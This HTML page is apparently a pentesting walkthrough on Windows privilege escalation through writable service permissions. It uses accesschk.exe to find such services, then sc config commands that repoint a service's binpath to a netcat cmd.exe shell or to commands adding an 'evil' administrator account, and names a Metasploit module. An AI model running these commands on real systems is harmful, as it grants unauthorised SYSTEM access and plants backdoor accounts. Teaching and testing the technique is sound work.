<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Walkthrough</title>
</head><body>Check access rights. Grab <a href="http://technet.microsoft.com/en-us/sysinternals/bb842062.aspx">accesschk.exe</a>&nbsp;from Sysinternals. Accesschk can automatically check if we have write access to a Windows service with a certain user level. <br/>
Generally as a low privilege user we will want to check for "Authenticated Users". Make sure to check which user groups you user belongs to, "Power Users" for example is considered a low privilege user group (though it is not widely used). <br/>
<br/>
Look for Write access to a service in order to reconfigure it to gain elevated access. <br/>
Also look for SERVICE_START_NAME: LocalSystem which means the service will run the command as SYSTEM<br/>
<br/>
<br/>
# We can use sc to query, configure and manage windows services.<br/>
C:\Windows\system32&gt; sc qc Spooler<br/>
<br/>
# We can see the permissions that each user level has, you can also use "accesschk.exe -ucqv *" to list for a specific service<br/>
# Remember, first time running accesschk.exe also use /accepteula<br/>
C:\&gt; accesschk.exe -ucqv Spooler<br/>
<br/>
# You can enum all services that can be modified with<br/>
C:\&gt; accesschk.exe -uwcqv "Authenticated Users" *<br/>
or<br/>
C:\&gt; accesschk.exe -uwcq * | findstr /v AUTHORITY | findstr /v Administrators <ul><li style="list-style-type: none">Note: Not all languages spell "Administrators" the same</li>
</ul>
<br/>
<span style="font-family: inherit">C:\&gt; accesschk.exe -ucqv upnphost<br/>
<br/>
upnphost<br/>
<br/>
&nbsp; RW NT AUTHORITY\SYSTEM<br/>
&nbsp; &nbsp; &nbsp; &nbsp; SERVICE_ALL_ACCESS<br/>
&nbsp; RW BUILTIN\Administrators<br/>
&nbsp; &nbsp; &nbsp; &nbsp; SERVICE_ALL_ACCESS<br/>
<b>&nbsp; RW NT AUTHORITY\Authenticated Users<br/>
</b><b>&nbsp; &nbsp; &nbsp; &nbsp; SERVICE_ALL_ACCESS</b><br/>
&nbsp; RW BUILTIN\Power Users<br/>
&nbsp; &nbsp; &nbsp; &nbsp; SERVICE_ALL_ACCESS<br/>
&nbsp; RW NT AUTHORITY\LOCAL SERVICE<br/>
&nbsp; &nbsp; &nbsp; &nbsp; SERVICE_ALL_ACCESS<br/>
</span><br/>
<img src="image 2.png" /><br/>
<br/>
sc config upnphost binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"<br/>
#Remember, not limited to this command, you can use anything like: "cmd /c net user evil password /add &amp;&amp; net localgroup Administrators evil /add"<br/>
#This changes the SERVICE_START_NAME<br/>
sc config upnphost obj= ".\LocalSystem" password= ""<br/>
## NOTE: some services may error and require that obj be set to obj= "NT AUTHORITY\LocalService" password= ""<br/>
## NOTE: may also need to set the start type to on demand: sc config <i>ServiceName</i>&nbsp;start= demand<br/>
sc qc upnphost<br/>
net start upnphost<br/>
<br/>
<br/>
The sc utility throws an error each time we start the service with one of our malicious commands in the binpath. &nbsp;This is because the net user and net localgroup commands do not point to the service binary and therefore the SCM cannot communicate with the service. &nbsp;Never fear, however, as the error is thrown only after issuing our malicious commands.<br/>
<br/>
The important thing to remember is that we find out what user groups our compromised session belongs to. As mentioned previously "Power Users" is also considered to be a low privileged user group. "Power Users" have their own set of vulnerabilities, Mark Russinovich has written a very interesting <a href="http://blogs.technet.com/b/markrussinovich/archive/2006/05/01/the-power-in-power-users.aspx">article</a>&nbsp;on the subject.<br/>
<br/>
Metasploit module: exploit/windows/local/service_permissions<br/>
&nbsp;&#09;1. Tries to create and start a service<br/>
&nbsp;&#09;2. Attempts to change binpath of a service and restart<br/>
&nbsp;&#09;3. See if binpath exe file's folder is writeable, create a new exe and restar the service<br/>
<br/>
</body></html>